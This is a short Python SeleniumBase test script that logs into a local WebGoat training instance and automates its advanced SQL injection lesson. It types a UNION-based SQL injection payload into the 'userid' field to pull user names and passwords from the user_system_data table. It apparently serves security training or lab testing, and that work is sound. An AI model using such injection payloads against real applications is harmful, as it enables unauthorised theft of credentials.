# -*- coding: utf-8 -*-
from seleniumbase import BaseCase


class SqlInjection(BaseCase):

    def test_sql_injection(self):
        self.open('http://webgoat:8080/WebGoat/login')
        self.update_text('#exampleInputEmail1', 'testuser')
        self.update_text('#exampleInputPassword1', 'testpw')
        self.click("//button[@type='submit']")
        self.open('http://webgoat:8080/WebGoat/start.mvc#lesson/SqlInjectionAdvanced.lesson')
        self.click("//div[@id='lesson-page-controls']/div/div[2]/a[3]/div")
        self.click('[name="userid_6a"]')
        self.update_text('[name="userid_6a"]', "x' UNION SELECT 1,user_name,password,'','','',7 FROM user_system_data; --")
        self.driver.find_element_by_name("Get Account Info").click()
